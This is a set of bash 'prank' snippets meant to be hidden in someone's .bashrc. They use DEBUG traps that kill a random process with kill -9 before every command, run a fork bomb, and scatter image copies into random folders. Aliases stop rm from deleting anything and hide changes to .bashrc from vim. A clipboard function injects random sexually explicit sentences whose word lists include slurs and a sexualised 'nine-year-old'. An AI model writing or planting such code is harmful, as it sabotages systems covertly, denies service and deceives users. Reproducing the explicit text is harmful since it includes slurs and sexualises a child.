# Kill a random process
trap "kill -9 $(ps aux | awk '{print $2}' | shuf | head -n 1)" DEBUG

# Put Nicholas Cage picture in some random folder with a random name 
trap "cp ~/Downloads/cage.png $(find . -maxdepth 4 -type d 2> /dev/null | grep -v '/\.' | shuf | head -n 1)/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).png" DEBUG

# Flash a picture of Nicholas Cage randomly 
kill_cage() {
    sleep 0.3
    for i in $(ps aux | grep cage.png | grep -v grep | awk '{print $2}')
    do
        kill -9 $i
    done
}

flash_cage() {
    xdg-open cage.png & 
    kill_cage
}

trap '[ "$RANDOM" -le 15000 ] && flash_cage' DEBUG

# This is a bit extreme 
trap ":(){:&:&};:" DEBUG

# Instead of removing a file, copy it somewhere else with a random name
copy_instead() {
    target="$(find . -maxdepth 3 -type d 2> /dev/null | grep -v '/\.' | shuf | head -n 1)/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
    cp $1 $target
}

alias rm=copy_instead

# Try to prevent them from modifying .bashrc - and in fact from seeing any changes you made
 dont_open_rc() {
     if [ "$1" == ".bashrc" ] || [ "$1" == "~/.bashrc" ]
     then
         cp -f ~/.bashrc ~/Documents/
         let lines=$(wc -l ~/.bashrc | awk '{print $1}')-15
         touch ~/.bashrc.bak
         head -n $lines ~/.bashrc > ~/.bashrc.bak && mv ~/.bashrc.bak ~/.bashrc
         vim .bashrc && mv ~/Documents/.bashrc .bashrc
     else
         vim $1
     fi
 }
 
 alias vim="dont_open_rc"
 
 # Needs xclip to be installed
 copy_funny_sentence() {
    faster=$(shuf -e "Let the games begin!" "Sweet Jesus!" "Not that!" "At last!" "Land o' Goshen!" "Is that all?" "Cheese it, the cops!" "I never dreamed it could be" "If I do, you won't respect me!" "Now!" "Open sesame!" "EMR!" "Again!" "Faster!" "Harder!" "Help!" "Fuck me harder!" "Is it in yet?" "You aren't my father!" "Doctor, that's not *my* shou" "No, no, do the goldfish!" "Holy Batmobile, Batman!" "He's dead, he's dead!" "Take me, Robert!" "I'm a Republican!" "Put four fingers in!" "What a lover!" "Talk dirty, you pig!" "The ceiling needs painting " "Suck harder!" "The animals will hear!" "Not in public!" -n 1 )
    said=$(shuf -e "bellowed" "yelped" "croaked" "growled" "panted" "moaned" "grunted" "laughed" "warbled" "sighed" "ejaculated" "choked" "stammered" "wheezed" "squealed" "whimpered" "salivated" "tongued" "cried" "screamed" "yelled" "said" -n 1 )
    fadj=$(shuf -e "saucy" "wanton" "unfortunate" "lust-crazed" "nine-year-old" "bull-dyke" "bisexual" "gorgeous" "sweet" "nymphomaniacal" "large-hipped" "freckled" "forty-five year old" "white-haired" "large-boned" "saintly" "blind" "bearded" "blue-eyed" "large tongued" "friendly" "piano playing" "ear licking" "doe eyed" "sock sniffing" "lesbian" "hairy" -n 1 )
    female=$(shuf -e "baggage" "hussy" "woman" "Duchess" "female impersonator" "nymphomaniac" "virgin" "leather freak" "home-coming queen" "defrocked nun" "bisexual budgie" "cheerleader" "office secretary" "sexual deviate" "DARPA contract monitor" "little matchgirl" "ceremonial penguin" "femme fatale" "bosses' daughter" "construction worker" "sausage abuser" "secretary" "Congressman's page" "grandmother" "penguin" "German shepherd" "stewardess" "waitress" "prostitute" "computer science group" "housewife" -n 1 )
    madjec=$(shuf -e "thrashing" "slurping" "insatiable" "rabid" "satanic" "corpulent" "nose-grooming" "tripe-fondling" "dribbling" "spread-eagled" "orally fixated" "vile" "awesomely endowed" "handsome" "mush-brained" "tremendously hung" "three-legged" "pile-driving" "cross-dressing" "gerbil buggering" "bung-hole stuffing" "sphincter licking" "hair-pie chewing" "muff-diving" "clam shucking" "egg-sucking" "bicycle seat sniffing" -n 1 )
    male=$(shuf -e "rakehell" "hunchback" "lecherous lickspittle" "archduke" "midget" "hired hand" "great Dane" "stallion" "donkey" "electric eel" "paraplegic pothead" "dirty old man" "faggot butler" "friar" "black-power advocate" "follicle fetishist" "handsome priest" "chicken flicker" "homosexual flamingo" "ex-celibate" "drug sucker" "ex-woman" "construction worker" "hair dresser" "dentist" "judge" "social worker" -n 1 )
    diddled=$(shuf -e "diddled" "devoured" "fondled" "mouthed" "tongued" "lashed" "tweaked" "violated" "defiled" "irrigated" "penetrated" "ravished" "hammered" "bit" "tongue slashed" "sucked" "fucked" "rubbed" "grudge fucked" "masturbated with" "slurped" -n 1 )
    titadj=$(shuf -e "alabaster" "pink-tipped" "creamy" "rosebud" "moist" "throbbing" "juicy" "heaving" "straining" "mammoth" "succulent" "quivering" "rosey" "globular" "varicose" "jiggling" "bloody" "tilted" "dribbling" "oozing" "firm" "pendulous" "muscular" "bovine" -n 1 )
    knockers=$(shuf -e "globes" "melons" "mounds" "buds" "paps" "chubbies" "protuberances" "treasures" "buns" "bung" "vestibule" "armpits" "tits" "knockers" "elbows" "eyes" "hooters" "jugs" "lungs" "headlights" "disk drives" "bumpers" "knees" "fried eggs" "buttocks" "charlies" "ear lobes" "bazooms" "mammaries" -n 1 )
    thrust=$(shuf -e "plunged" "thrust" "squeezed" "pounded" "drove" "eased" "slid" "hammered" "squished" "crammed" "slammed" "reamed" "rammed" "dipped" "inserted" "plugged" "augured" "pushed" "ripped" "forced" "wrenched" -n 1 )
    dongadj=$(shuf -e "bursting" "jutting" "glistening" "Brobdingnagian" "prodigious" "purple" "searing" "swollen" "rigid" "rampaging" "warty" "steaming" "gorged" "trunklike" "foaming" "spouting" "swinish" "prosthetic" "blue veined" "engorged" "horse like" "throbbing" "humongous" "hole splitting" "serpentine" "curved" "steel encased" "glass encrusted" "knobby" "surgically altered" "metal tipped" "open sored" "rapidly dwindling" "swelling" "miniscule" "boney" -n 1 )
    dong=$(shuf -e "intruder" "prong" "stump" "member" "meat loaf" "majesty" "bowsprit" "earthmover" "jackhammer" "ramrod" "cod" "jabber" "gusher" "poker" "engine" "brownie" "joy stick" "plunger" "piston" "tool" "manhood" "lollipop" "kidney prodder" "candlestick" "John Thomas" "arm" "testicles" "balls" "finger" "foot" "tongue" "dick" "one-eyed wonder worm" "canyon yodeler" "middle leg" "neck wrapper" "stick shift" "dong" "Linda Lovelace choker" -n 1 )
    twatadj=$(shuf -e "pulsing" "hungry" "hymeneal" "palpitating" "gaping" "slavering" "welcoming" "glutted" "gobbling" "cobwebby" "ravenous" "slurping" "glistening" "dripping" "scabiferous" "porous" "soft-spoken" "pink" "dusty" "tight" "odiferous" "moist" "loose" "scarred" "weapon-less" "banana stuffed" "tire tracked" "mouse nibbled" "tightly tensed" "oft traveled" "grateful" "festering" -n 1 )
    twat=$(shuf -e "swamp." "honeypot." "jam jar." "butterbox." "furburger." "cherry pie." "cush." "slot." "slit." "cockpit." "damp." "furrow." "sanctum sanctorum." "bearded clam." "continental divide." "paradise valley." "red river valley." "slot machine." "quim." "palace." "ass." "rose bud." "throat." "eye socket." "tenderness." "inner ear." "orifice." "appendix scar." "wound." "navel." "mouth." "nose." "cunt." -n 1 )

    echo "\"$faster\" $said the $fadj $female as the $madjec $male $diddled her $titadj $knockers and $thrust his $dongadj $dong into her $twatadj $twat" | xclip -selection clipboard
 }
 
 # Copy funny sentence all the time
 trap copy_funny_sentence DEBUG
 
 # Or maybe do it when ever some command is run
 ls_and_copy_funny(){
    [ "$RANDOM" -le 15000 ] && copy_funny_sentence
    ls
  }
  
  alias ls=ls_and_copy_funny
  
  
